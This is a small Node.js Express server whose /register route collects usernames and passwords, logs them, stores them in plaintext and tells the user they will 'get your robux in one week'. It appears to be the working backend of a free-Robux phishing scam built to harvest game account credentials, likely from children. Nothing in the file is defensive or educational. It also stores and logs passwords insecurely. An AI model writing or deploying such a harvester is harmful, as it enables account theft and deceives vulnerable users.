const express = require("express");
const db = require("./db");

const app = express();
const PORT = process.env.PORT || 3000;

// middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static("public"));

// health check (VERY IMPORTANT)
app.get("/health", (req, res) => {
  res.send("OK");
});

app.post("/register", (req, res) => {
  console.log("➡️ /register hit");
  console.log("BODY RECEIVED:", req.body);

  const { username, password } = req.body;

  // guard checks
  if (!username || !password) {
    console.error("❌ Missing fields");
    return res.status(400).send("Missing username or password");
  }

  const query = `
    INSERT INTO users (username, password)
    VALUES (?, ?)
  `;

  db.query(query, [username, password], (err, result) => {
    if (err) {
      console.error("❌ FULL DB QUERY ERROR:");
      console.error(err);
      return res.status(500).send(err.message);
    }

    console.log("✅ INSERT OK:", result.insertId);
    res.send("Success! You will get your robux in one week");
  });
});

app.listen(PORT, () => {
  console.log("✅ Server running on port", PORT);
});
